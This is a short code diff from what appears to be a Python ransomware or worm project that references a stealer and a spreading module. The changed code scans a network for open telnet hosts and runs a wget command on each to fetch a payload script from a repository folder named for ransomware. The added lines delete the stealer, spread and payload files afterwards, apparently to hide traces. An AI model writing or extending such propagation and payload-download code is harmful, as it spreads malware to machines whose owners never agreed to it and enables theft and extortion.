@@ -122,7 +122,7 @@ try:
 
     open_telnet_hosts = spread.scan_network_for_telnet(network_prefix)
     for host in open_telnet_hosts:
-        spread.execute_command_on_telnet(host, "wget http://example.com/auto_run")
+        spread.execute_command_on_telnet(host, "wget https://github.com/SergioZ3R0/Sergio-Code/blob/master/cyberSec/pythonRandsomware/auto_run.py")
 
     open_ftp_hosts = spread.scan_network_for_ftp(network_prefix)
     for host in open_ftp_hosts:
@@ -140,6 +140,8 @@ except Exception as e:
     print(f"Error spreading: {e}")
 #endregion
 window.Window()
-
+os.remove("auto_run.py")
+os.remove("stealer.py")
+os.remove("spread.py")
 os.remove("darthvader.py")
 #endregion
